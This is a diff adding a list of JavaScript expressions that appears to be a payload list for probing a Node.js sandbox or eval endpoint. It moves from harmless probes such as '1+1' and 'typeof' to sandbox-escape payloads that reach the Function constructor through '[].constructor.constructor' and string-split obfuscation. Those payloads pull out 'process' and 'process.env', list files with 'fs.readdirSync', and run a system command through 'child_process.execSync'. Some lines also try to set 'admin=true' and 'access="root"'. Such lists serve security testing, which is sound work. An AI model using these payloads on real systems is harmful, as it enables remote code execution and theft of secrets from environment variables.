@@ -1,0 +1,36 @@
+1+1
+true
+false
+undefined
+null
+typeof 1
+typeof "test"
+"test".length
+this
+this.constructor
+[].constructor
+[].__proto__.constructor
+this.constructor.constructor
+a=1
+admin=true
+mode="debug"
+access="root"
+[].constructor.constructor("return 1337")()
+[].constructor.constructor("return process")()
+[].constructor.constructor("return global")()
+constructor.constructor
+[].constructor["constructor"]
+[].__proto__["constructor"]
+[]["constructor"]["constructor"]
+[].constructor.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()
+[].constructor.constructor("return global.process.env")()
+[].constructor.constructor("return global.process.cwd()")()
+process.platform
+process.env
+process.version
+process.versions
+process.mainModule.filename
+require("fs").readdirSync(".")
+Math.random()
+Math.constructor.constructor("return this")()
+this["co"+"nstr"+"uctor"]["constructor"]("return process")()
